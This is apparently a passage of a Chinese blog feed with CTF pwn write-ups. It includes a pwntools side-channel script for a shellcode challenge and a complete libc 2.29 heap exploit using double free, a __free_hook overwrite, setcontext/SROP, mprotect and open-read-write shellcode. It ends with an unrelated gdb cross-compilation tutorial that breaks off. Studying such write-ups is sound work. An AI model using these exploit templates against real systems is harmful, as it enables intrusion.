class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这个题比较有意思的就是shellcraf.cat的那个操作，没有使用read系统调用，可以说是另一种orw,从汇编里可以看到采用了sendfile这个系统调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print shellcraft.cat(&quot;flag&quot;)</span><br><span class="line">    /* push &apos;flag\x00&apos; */</span><br><span class="line">    push 1</span><br><span class="line">    dec byte ptr [esp]</span><br><span class="line">    push 0x67616c66</span><br><span class="line">    /* open(file=&apos;esp&apos;, oflag=&apos;O_RDONLY&apos;, mode=0) */</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call open() */</span><br><span class="line">    push SYS_open /* 5 */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line">    /* sendfile(out_fd=1, in_fd=&apos;eax&apos;, offset=0, count=0x7fffffff) */</span><br><span class="line">    push 1</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, eax</span><br><span class="line">    xor edx, edx</span><br><span class="line">    push 0x7fffffff</span><br><span class="line">    pop esi</span><br><span class="line">    /* call sendfile() */</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0xbb</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure><h2 id="babyshellcode"><a href="#babyshellcode" class="headerlink" title="babyshellcode"></a>babyshellcode</h2><p>基本同2020年天翼杯safebox原题，2021年蓝帽杯线下原题，找到⽹上wp修改⼀些关键部分地 址，采⽤侧信道⽅式爆破flag即可。网上模版还是用的不顺手，还是记一下自己的模板吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">EXCV = context.binary = <span class="string">'./chall'</span></span><br><span class="line">e = ELF(EXCV)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> args.I:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(p, index, ch)</span>:</span></span><br><span class="line">    shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">    xor rdi, rdi;</span></span><br><span class="line"><span class="string">    push 0x10100;</span></span><br><span class="line"><span class="string">    pop rsi;</span></span><br><span class="line"><span class="string">    push 0x100;</span></span><br><span class="line"><span class="string">    pop rdx;</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string">    jmp rsi;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Are you a shellcode master?\n'</span>)</span><br><span class="line">    p.send(asm(shellcode).ljust(<span class="number">0x18</span>,<span class="string">b'a'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open</span></span><br><span class="line">    shellcode = <span class="string">"mov rax, 0x67616c662f2e; push rax; mov rdi,rsp;"</span></span><br><span class="line">    shellcode += <span class="string">"xor esi, esi; xor rdx, rdx;"</span></span><br><span class="line">    shellcode += <span class="string">"push 2; pop rax; syscall;"</span></span><br><span class="line">    <span class="comment"># shellcode = "push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;"</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># re open, rax =&gt; 4</span></span><br><span class="line">    shellcode += <span class="string">"push 2; pop rax; syscall;"</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># read(rax, 0x10040, 0x50)</span></span><br><span class="line">    shellcode += <span class="string">"mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># cmp and jz</span></span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        shellcode += <span class="string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span>.format(index, ch)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode += <span class="string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span>.format(index, ch)</span><br><span class="line"> </span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line"> </span><br><span class="line">    p.send(shellcode.ljust(<span class="number">0x100</span><span class="number">-14</span>, <span class="string">b'a'</span>) + <span class="string">b'/home/pwn/flag'</span>)</span><br><span class="line"> </span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> args.R:</span><br><span class="line">            p = remote(<span class="string">'106.14.120.231'</span>,<span class="number">28444</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(EXCV)</span><br><span class="line">        pwn(p, index, ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">1.5</span>:</span><br><span class="line">            ans.append(ch)</span><br><span class="line">            print(<span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(EXCV)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pwn(p,0, 0x20)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;主要是看到的shellcode的骚操作&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>长城杯writeup</title>
    <link href="wood1314.github.io/year/10/14/clgvp3n7a006n6n3f6pjxtuge/"/>
    <id>wood1314.github.io/year/10/14/clgvp3n7a006n6n3f6pjxtuge/</id>
    <published>2021-10-14T15:37:01.000Z</published>
    <updated>2021-10-14T15:46:17.816Z</updated>
    
    <content type="html"><![CDATA[<p>当时没时间写，后面用自己本地2.29libc的环境复现了下，libc2.29打free_hook orw的模板</p><a id="more"></a><h2 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 题目描述"></a>0x01 题目描述</h2><p>libc2.29 具有doble free的漏洞，具有add，show，edit，delete的功能，但只能申请0x60大小以下的堆块，并且需要orw</p><h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ul><li>泄漏堆地址后，修改一个chunk的size大于0x440,free掉后从而泄漏libc地址</li><li>在堆上布置好shellcode，frame内容后把 free_hook更改为2.29特殊的gadget，然后free掉一个堆快来设置rdi和rdx</li></ul><h2 id="0x03-小trick"><a href="#0x03-小trick" class="headerlink" title="0x03 小trick"></a>0x03 小trick</h2><p>搜索2.29 从rdi转到rdx的gadget</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ./libc-2.29.so --search 'mov rdx'|grep "rdi + 8"</span><br></pre></td></tr></table></figure><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process('./pwn')</span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line">#sh = remote('47.104.175.110',20066)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">context.arch = 'amd64'</span><br><span class="line">context.os = 'linux'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"><span class="function">def <span class="title">menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil("&gt;&gt; \n")</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('input size:\n')</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">move</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('context:\n')</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">4</span>)</span></span></span><br><span class="line">    sh.recvuntil('\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">15</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(<span class="number">1</span>, <span class="number">0x40</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">heap_base </span>= u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x9f0</span></span><br><span class="line">log.success('heap_base: ' + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">15</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x40</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">0</span>, p64(heap_base + <span class="number">0x1210</span><span class="number">-0x10</span>) + <span class="string">'\n'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x60</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x60</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span><span class="number">-0x50</span>+<span class="number">0x10</span>) + <span class="string">'\n'</span>)</span></span></span><br><span class="line"><span class="function"><span class="meta"># add(1,0x40)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">libc_base </span>= u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">IO_file_jumps = <span class="number">0x1e6560</span> + libc_base</span><br><span class="line">IO_str_jumps = libc_base + <span class="number">0x1e6620</span></span><br><span class="line">binsh_addr = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">stdout_file = libc_base + <span class="number">0x1e5680</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line">mov rax,<span class="number">0x67616c662f2e</span></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rsi,<span class="number">0</span></span><br><span class="line">mov rdx,<span class="number">0</span></span><br><span class="line">mov rax,<span class="number">2</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,<span class="number">1024</span></span><br><span class="line">mov rax,<span class="number">0</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,<span class="number">1</span></span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,rax</span><br><span class="line">mov rax,<span class="number">1</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,<span class="number">0</span></span><br><span class="line">mov rax,<span class="number">60</span></span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x2500</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x5000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">frame.rip = libc.sym['mprotect'] + libc_base</span><br><span class="line"></span><br><span class="line">payload = str(frame)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, len(str(frame)), <span class="number">0x60</span>):</span><br><span class="line">    move(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x2000</span> + i) + <span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload[i:i+<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">shellcode =p64(heap_base + <span class="number">0x2500</span> + <span class="number">8</span>) + <span class="keyword">asm</span>(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, len(shellcode), <span class="number">0x60</span>):</span><br><span class="line">    move(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x2500</span> +i) + <span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">1</span>, shellcode[i:i+<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">gadget = <span class="number">0x12be97</span> + libc_base</span><br><span class="line"></span><br><span class="line">set_contextaddr = libc_base + libc.sym['setcontext']</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'\n'</span>)</span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x3000</span> +i) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(set_contextaddr+<span class="number">53</span>) + p64(heap_base + <span class="number">0x2000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'\n'</span>)</span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://oneda1sy.gitee.io/2021/05/24/heap-Plain-SeccompAttack2.29/" target="_blank" rel="noopener">https://oneda1sy.gitee.io/2021/05/24/heap-Plain-SeccompAttack2.29/</a></p><p><a href="https://wood1314.github.io/year/04/06/cklza4rcn000dalu506tx8974/#more">https://wood1314.github.io/year/04/06/cklza4rcn000dalu506tx8974/#more</a></p><p><a href="https://darkeyer.github.io/2020/08/17/FSOP在glibc2.29中的利用/" target="_blank" rel="noopener">https://darkeyer.github.io/2020/08/17/FSOP在glibc2.29中的利用/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当时没时间写，后面用自己本地2.29libc的环境复现了下，libc2.29打free_hook orw的模板&lt;/p&gt;
    
    </summary>
    
      <category term="pwn题writeup" scheme="wood1314.github.io/categories/pwn%E9%A2%98writeup/"/>
    
    
      <category term="pwn writeup" scheme="wood1314.github.io/tags/pwn-writeup/"/>
    
  </entry>
  
  <entry>
    <title>gdb交叉编译</title>
    <link href="wood1314.github.io/year/10/13/clgvp3n5v002l6n3f3vwnmrpw/"/>
    <id>wood1314.github.io/year/10/13/clgvp3n5v002l6n3f3vwnmrpw/</id>
    <published>2021-10-13T15:43:48.000Z</published>
    <updated>2021-10-17T09:16:08.378Z</updated>
    
    <content type="html"><![CDATA[<p>最近在编译gdb和交叉编译gdb的时候学习到的一些东西</p><a id="more"></a><p><img src="https://pic.imgdb.cn/item/616be95f2ab3f51d919a3e7d.png" alt></p><p><img src="https://pic.imgdb.cn/item/616be9902ab3f51d919a6a09.png" alt></p><h2 id="0x01-configure、-make、-make-install-背后的原理"><a href="#0x01-configure、-make、-make-install-背后的原理" class="headerlink" title="0x01 configure、 make、 make install 背后的原理"></a>0x01 configure、 make、 make install 背后的原理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>接下来让我们深入 Unix 去搞清楚这几行命令的作用。</p><h3 id="做了什么"><a href="#做了什么" class="headerlink" title="做了什么"></a>做了什么</h3><p>整个过程分为三步：</p><ol><li>配置</li></ol><p><code>configure</code> 脚本负责在你使用的系统上准备好软件的构建环境。确保接下来的构建和安装过程所需要的依赖准备好，并且搞清楚使用这些依赖需要的东西。</p><p>Unix 程序一般是用 C 语言写的，所以我们通常需要一个 C 编译器去构建它们。在这个例子中 <code>configure</code> 要做的就是确保系统中有 C 编译器，并确定它的名字和路径。</p><ol><li>构建</li></ol><p>当 <code>configure</code> 配置完毕后，可以使用 <code>make</code> 命令执行构建。这个过程会执行在 <code>Makefile</code> 文件中定义的一系列任务将软件源代码编译成可执行文件。</p><p>你下载的源码包一般没有一个最终的 <code>Makefile</code> 文件，一般是一个模版文件 <code>Makefile.in</code> 文件，然后 <code>configure</code> 根据系统的参数生成一个定制化的 <code>Makefile</code> 文件。</p><ol><li>安装</li></ol><p>现在软件已经被构建好并且可以执行，接下来要做的就是将可执行文件复制到最终的路径。<code>make install</code> 命令就是将可执行文件、第三方依赖包和文档复制到正确的路径。</p><p>这通常意味着，可执行文件被复制到某个 <code>PATH</code> 包含的路径，程序的调用文档被复制到某个 <code>MANPATH</code> 包含的路径，还有程序依赖的文件也会被存放在合适的路径。</p><p>因为安装这一步也是被定义在 <code>Makefile</code> 中，所以程序安装的路径可以通过 <code>configure</code> 命令的参数指定，或者 <code>configure</code> 通过系统参数决定。</p><p>如果要将可执行文件安装在系统路径，执行这步需要赋予相应的权限，一般是通过 sudo。</p><p><strong>安装过程简单说就是 configure 脚本根据系统信息将 <a href="http://makefile.in/" target="_blank" rel="noopener">Makefile.in</a> 模版文件转换为 Makefile文件</strong></p><h3 id="1-1-build-–host-–target"><a href="#1-1-build-–host-–target" class="headerlink" title="1.1 -build –host –target"></a>1.1 -build –host –target</h3><p>源码经过编译生成可执行程序。根据执行编译操作的平台、可执行程序的运行平台、可执行的程序的处理平台，可以将编译操作分为多种类型，对应的三个配置参数如下：</p><ul><li><strong>–build</strong>：运行编译工具链的平台，也就是正在执行编译操作的平台。如果未指定此参数，则通过 config.guess 猜测得到。通常都不指定此参数。</li><li><strong>-host</strong>：可执行程序将运行的平台。如果未指定此参数，则和 –build 相同<code>。如果 --host 和 --build 不同，是交叉编译；否则是普通编译。</code></li><li><strong>-target</strong>：<code>可执行程序将处理的平台。</code>如果未指定此参数，则和 –host 相同。一般来说，程序运行在什么平台，处理的就是什么平台，此参数值和 –host 参数相同，不需显式指定，所以通常不会关注到此参数。但在制作交叉编译工具 (如 gcc、gdb 等) 这种特殊情况下，此值和 –host 不同，例如交叉编译器 arm-linux-gcc，它运行在 x86-linux 平台 (–host 参数)，但处理的是 arm-linux 平台 (–target 参数)。如果是交叉编译一个普通的应用，如运行于 arm-linux 平台的 tftp 程序，则它的运行平台和处理平台都是 arm-linux 平台。</li></ul><h3 id="1-2交叉编译gdb-mips-架构"><a href="#1-2交叉编译gdb-mips-架构" class="headerlink" title="1.2交叉编译gdb(mips 架构)"></a>1.2交叉编译gdb(mips 架构)</h3><p>如果是交叉编译gdb，只设置host参数就可以了。target默认会和host参数相同。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure --host=mipsel-openwrt-linux CC=mipsel-linux-gnu-gcc CXX=mipsel-linux-gnu-g++ CFLAGS=-static</span><br></pre></td></tr></table></figure><h3 id="1-3-64位环境下编译32位gdb"><a href="#1-3-64位环境下编译32位gdb" class="headerlink" title="1.3 64位环境下编译32位gdb"></a>1.3 64位环境下编译32位gdb</h3><p>需要依赖libdeflate库，因此先将libdflate库安装到指定文件夹下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo make CFLAGS=<span class="string">"-m32"</span></span><br><span class="line">sudo make install DESTDIR=/home/giantbranch/IOT/Tfuzz/<span class="built_in">test</span>/i386 CFLAGS=<span class="string">"-m32"</span></span><br></pre></td></tr></table></figure><p>然后编译gdb</p><ul><li>clean清除</li><li>消除掉原来的cache</li><li>重新设置config</li><li>在make时指定我们编译libdelate库的位置</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span 